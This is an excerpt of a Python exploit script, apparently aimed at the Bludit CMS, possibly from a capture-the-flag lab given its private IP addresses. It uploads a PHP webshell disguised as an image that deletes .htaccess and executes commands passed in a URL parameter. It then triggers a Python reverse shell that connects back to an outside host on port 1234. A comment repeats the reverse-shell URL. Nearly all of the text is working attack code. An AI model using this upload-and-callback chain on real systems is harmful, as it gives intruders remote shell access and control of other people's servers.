...
def subida_shell(url,la_cookie,token_logado,command,webshell):
    ...
    paramsMultipart = [('images[]', (webshell, "<?php shell_exec(\"rm .htaccess\");system($_GET[\"cmd\"]);?>", 'application/octet-stream'))]
    #paramsMultipart = [('images[]', (webshell, "<?php shell_exec(\"rm .htaccess ;" + command + "\");?>", 'application/octet-stream'))]
...
def trigger_command(url,webshell,command):
    ...
    try:
        #response = session.get(url + "/bl-content/tmp/" + webshell+"?cmd="+command, headers=headers, timeout=1)

        response = session.get(url + "/bl-content/tmp/" + webshell+ "?cmd=python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.15.211\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);\'", headers=headers, timeout=1)
...
#http://10.10.10.176/bl-content/tmp/pqqocgrj.jpg?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.176",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

if __name__ == '__main__':
    args = get_args()
    webshell = randomString(8) + ".php"
    #webshell = "goober.jpg"
